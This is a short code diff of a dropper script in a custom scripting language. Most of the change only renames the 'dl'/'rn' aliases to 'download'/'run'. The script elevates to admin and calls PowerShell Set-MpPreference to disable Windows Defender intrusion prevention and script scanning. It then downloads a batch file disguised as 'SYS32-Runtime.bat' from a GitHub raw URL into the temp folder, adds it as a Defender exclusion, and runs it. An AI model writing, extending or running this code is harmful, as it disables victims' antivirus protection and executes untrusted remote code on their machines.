@@ -1,8 +1,5 @@
 func main()
 {
-	keyword "download" = "dl"
-	keyword "run" = "rn"
-
 	if ("{isadmin}" == "False")
 	{
 		runadmin()
@@ -29,9 +26,9 @@ func main()
 		process("powershell.exe" "Set-MpPreference -DisableIntrusionPreventionSystem $true" "runas")
 		process("powershell.exe" "Set-MpPreference -DisableScriptScanning $true" "runas")
 	
-		dl("https://raw.githubusercontent.com/Devalah/test/refs/heads/main/SYS32-Runtime.bat" "[temp]\test.bat" 1)
+		download("https://raw.githubusercontent.com/Devalah/test/refs/heads/main/SYS32-Runtime.bat" "[temp]\test.bat" 1)
 		process("powershell.exe" "Add-MpPreference -ExclusionPath [temp]\test.bat" "runas")
-		rn("[temp]\test.bat")
+		run("[temp]\test.bat")
 	
 		quit()
 	}
